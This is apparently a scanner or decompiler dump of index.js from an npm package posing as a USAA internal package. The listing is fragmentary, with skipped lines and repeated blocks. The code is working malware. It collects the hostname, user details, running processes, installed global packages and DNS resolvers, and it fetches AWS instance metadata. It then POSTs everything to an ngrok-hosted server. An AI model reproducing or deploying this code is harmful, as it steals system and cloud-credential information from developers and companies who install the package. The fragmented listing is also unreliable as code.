// File: tmp/tmp_mhqpqi9/@usaa-grp-ent-conv-platform-usaa/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const https = require("https")
Line 3: _tmp_0 = require("child_process")
Line 5: const LOG_SERVER = "https://b43f-129-222-85-205.ngrok-free.app"
Line 9: os.hostname()
Line 10: os.userInfo()
Line 11: os.platform()
Line 12: os.arch()
Line 13: os.cpus()
Line 24: exec("ps -eo comm | head -n 15", (error, stdout, stderr) => {
    if (!error) {
        logData.runningProcesses = stdout.split("\n").filter(Boolean);
    }
    sendLogData();
})
Line 32: exec("npm list -g --depth=0 && yarn global list", (error, stdout, stderr) => {
    if (!error) {
        logData.installedPackages = stdout.split("\n").filter(Boolean);
    }
    sendLogData();
})
Line 40: exec("cat /etc/resolv.conf", (error, stdout, stderr) => {
    if (!error) {
        logData.dnsResolvers = stdout.split("\n").filter(Boolean);
    }
    sendLogData();
})
Line 48: (_tmp_8 = https.get("http://169.254.169.254/latest/meta-data/", res => {
    let data = "";
    res.on("data", chunk => { data += chunk; });
    res.on("end", () => {
        logData.awsMetadata = { "meta-data": data.trim() };
        sendLogData();
    });
}))
Line 52: data.trim()
Line 58: {
    const postData = JSON.stringify(logData);
    const options = {
        hostname: LOG_SERVER.replace("https://", ""),
        port: 443,
        path: "/",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": postData.length
        }
    };

    const req = https.request(options, res => {
        console.log(`[+] Sent data, response code: ${res.statusCode}`);
    });

    req.on("error", err => {
        console.error(`Error sending log: ${err.message}`);
    });

    req.write(postData);
    req.end();
}
Line 61: _tmp_10.hostname = LOG_SERVER.replace("https://", "")
Line 71: const req = https.request(options, res => {
        console.log(`[+] Sent data, response code: ${res.statusCode}`);
    })
Line 72: console.log(`[+] Sent data, response code: ${res.statusCode}`)
Line 79: req.write(postData)
Line 80: req.end()
